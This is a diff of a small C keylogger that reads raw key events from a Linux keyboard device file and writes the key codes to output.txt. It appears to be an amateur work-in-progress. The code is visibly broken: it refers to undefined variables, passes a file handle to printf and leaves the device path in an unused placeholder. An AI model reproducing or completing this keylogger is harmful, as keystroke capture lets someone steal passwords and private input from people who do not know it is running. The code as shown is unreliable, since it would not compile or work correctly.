@@ -20,14 +20,19 @@ char *keys[] = {
   "0"
   }
 
-void keylogReadAndPrint(char *keyboardPath, FILE *output)
+void main()
 {
+  // open output text file to store decoded keystrokes
+  FILE *fout;
+  fout = fopen("output.txt", "w");
+
   //open the eventX file that records keystrokes
   char keyboardPath_EVENTUALLYREPLACE[] = "/dev/input/by-path/platform-i8042-serio-0-event-kbd";
   int device = open(keyboardPath, O_RDONLY);
   struct input_event inpEvent;
 
   // I don't know why we would need this, but a lot of code i read contained this to cancel loop when Ctrl-C is pressed; that already happens though
+
   //signal(SIGINT, INThandler);
 
   while(1)
@@ -40,12 +45,13 @@ void keylogReadAndPrint(char *keyboardPath, FILE *output)
       if (events[i].code > 0 && events[i].code < TOT_KEYS)
       {
         //output the code of the standard keyboard button
-        printf(output, "%d\n", events[i].code);
+        fprintf(output, "%d\n", events[i].code);
       }
       else
       {
-        printf(output, "Key not recognized\n");
+        printf(fout, "Key not recognized\n");
       }
     }
   }
+  fclose(fout);
 }
